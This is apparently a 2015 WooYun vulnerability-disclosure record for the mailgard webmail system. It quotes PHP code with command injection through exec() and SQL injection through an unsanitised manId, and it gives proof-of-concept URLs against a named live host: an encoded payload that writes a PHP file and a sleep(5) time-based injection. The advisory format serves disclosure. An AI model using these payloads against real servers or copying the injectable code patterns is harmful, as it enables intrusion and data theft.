{"id": 35075, "wybug_id": "wooyun-2015-0104807", "wybug_title": " 佑友mailgard webmail邮件系统sql注射和命令执行(需登录）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-04-01 11:04", "wybug_open_date": "2015-07-02 18:32", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向公众公开  简要描述： 某邮件系统sql注射和命令执行 详细说明：  mailgard webmail：show_mail.php:\nrequire_once('../global.php');//获取参数信息$t_get_sd = urldecode($_GET['sd']);$_GET['sd'] = strlen($_GET['sd']) > strlen($t_get_sd) ? $t_get_sd : $_GET['sd'];list($box_name,$uid) = explode(':', $_GET['sd']);$box_name = ($box_name);$get_sd = urlencode($box_name). \":\" .$uid;if(strpos($_COOKIE['my_referer'],'box_list.php?sd=hicommail_search')!==false){\tif(strpos($_COOKIE['my_referer'],'&labelMail=1')!==false){\t\t$label = 'star';\t\t$label2 = 'star2';\t}else{\t\t$label = 'search';\t\t$label2 = 'search2';\t}}if($_GET['delMove']){\t//移动、删除和标记星标动作，会把搜索和星标的id会话记录清空\t//防止清空：记录到另一个只在show_mail.php页面使用的会话\tif($_SESSION['H_MAILS'][$label]['box:uid']){\t\t$_SESSION['H_MAILS'][$label2]['box:uid'] = $_SESSION['H_MAILS'][$label]['box:uid'];\t}\t\tif($_GET['delMove']=='delete' && $box_name=='Trash' || $_GET['delMove']=='shiftdelete'){\t\tselect_mailbox($connection,$box_name);\t\t$deleted = mail_flags($connection,'\\\\Deleted','+',$uid);\t}else{\t\tif($_GET['delMove']=='delete' && $box_name!='Trash'){\t\t\t$toBox = 'Trash';\t\t}elseif($_GET['delMove']=='move'){\t\t\t$toBox = $_GET['toBoxName'];\t\t}\t\tif($gDoveadm ==='0'){\t\t\t$toBox = mb_convert_encoding($toBox, 'UTF-8', 'UTF7-IMAP');\t\t\t$boxnm = mb_convert_encoding($box_name, 'UTF-8', 'UTF7-IMAP');\t\t\texec(\"sudo /usr/bin/doveadm move -u \".$gMyAccounts.\" '\".$toBox.\"' MAILBOX '\".$boxnm.\"' UID \".$uid);\n找到一个用户登录：发送url：http://mail.iconergy.com:889/src/show_mail.php?sd=aaaa%253A%2520%2526%2520echo%2520%2527%253C%253Fphp%2520phpinfo%2528%2529%253F%253E%2527%2520%253E%2520%252fvar%252fwww%252fnewmail%252fccc.php&delMove=move&toBoxName=yyy访问:http://mail.iconergy.com:889/bbb.phpsql注射地方:write_mail.php:\nrequire_once('../global.php');$filetime\t\t= time();$defAllUFSize\t= $defAllUFId = 0;$defImgsVal\t\t= $defFilesVal = '';$defUFSUnit\t\t= $defAllUFSize.' B';$dir = HM_ROOT.$gSubTmpUploadDir;if(!is_dir($dir)){\t@mkdir($dir,0722,true);//逐层检查创建0700权限}if($_GET['manId']){\t$to = getLinkmanByManid($_GET['manId']);\n跟进去getLinkmanByManid 看看:\n/* * 写邮件*/function getLinkmanByManid($manId){\tglobal $db,$gMyAccounts;\t$linkSql = \"SELECT * FROM `linkman` WHERE `man_id` IN ($manId) ORDER BY `sort` \";\t$linkResult = $db->query($linkSql);\twhile ($linkRs=$db->fetch_array ($linkResult)) {\t\t$rs[] = $linkRs['name'] ? '\"'.$linkRs['name'].'\" <'.$linkRs['mail_addr'].'>' : $linkRs['mail_addr'];\t}\tif($rs){\t\t$rs = implode(';',$rs);\t}else{\t\t$rs = '';\t}\treturn $rs;}\n直接请求:http://mail.iconergy.com:889/src/write_mail.php?manId=sleep(5)造成延迟 这里构造sql就不多说了   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-04-03 18:31 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}